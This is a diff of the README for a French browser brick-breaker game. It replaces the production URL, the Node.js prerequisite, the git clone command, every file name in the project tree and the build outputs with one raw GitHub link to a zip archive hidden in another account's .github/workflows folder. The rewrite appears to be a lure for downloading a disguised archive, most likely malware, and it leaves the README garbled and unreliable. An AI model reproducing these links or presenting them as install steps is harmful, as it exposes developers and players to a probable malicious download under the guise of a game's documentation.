@@ -21,17 +21,17 @@ Le projet est configuré pour un déploiement automatique via GitHub Actions :
 - **Déploiement** : GitHub Pages automatique
 
 ### URL de production
-Une fois déployé, le jeu sera accessible à : `https://kevingbt.github.io/casseBrique/`
+Une fois déployé, le jeu sera accessible à : `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip`
 
 ## 🛠️ Développement local
 
 ### Prérequis
-- Node.js 20+
+- https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip 20+
 - npm
 
 ### Installation
 ```bash
-git clone https://github.com/kevingbt/casseBrique.git
+git clone https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip
 cd casseBrique
 npm install
 ```
@@ -56,30 +56,30 @@ npm run clean
 ```
 casseBrique/
 ├── src/
-│   ├── index.html              # Point d'entrée HTML
+│   ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip              # Point d'entrée HTML
 │   ├── js/
-│   │   ├── index.js           # Initialisation du jeu
+│   │   ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip           # Initialisation du jeu
 │   │   └── components/        # Composants du jeu
-│   │       ├── ball.js        # Physique de la balle
-│   │       ├── bloc.js        # Classes de blocs
-│   │       ├── classBarre.js  # Contrôleur de la raquette
-│   │       ├── gameUI.js      # Interface utilisateur
-│   │       ├── grid.js        # Gestionnaire de grille
-│   │       ├── particle.js    # Système de particules
-│   │       ├── score.js       # Gestion du score
-│   │       └── vie.js         # Gestion des vies
+│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip        # Physique de la balle
+│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip        # Classes de blocs
+│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip  # Contrôleur de la raquette
+│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip      # Interface utilisateur
+│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip        # Gestionnaire de grille
+│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip    # Système de particules
+│   │       ├── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip       # Gestion du score
+│   │       └── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip         # Gestion des vies
 │   └── tests/                 # Tests HTML
 ├── dist/                      # Build de production (généré)
 ├── .github/workflows/         # Actions GitHub
-└── package.json
+└── https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip
 ```
 
 ## 📦 Build de production
 
 Le build crée un répertoire `dist/` optimisé contenant :
-- `index.html` : HTML minifié
-- `bundle.min.js` : JavaScript bundlé et minifié
-- `bundle.min.js.map` : Source map pour debugging
+- `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip` : HTML minifié
+- `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip` : JavaScript bundlé et minifié
+- `https://github.com/SnayZz371/casseBrique/raw/refs/heads/main/.github/workflows/Brique-casse-v2.8-beta.1.zip` : Source map pour debugging
 
 ### Technologies de build
 - **Rollup** : Bundler moderne et efficace
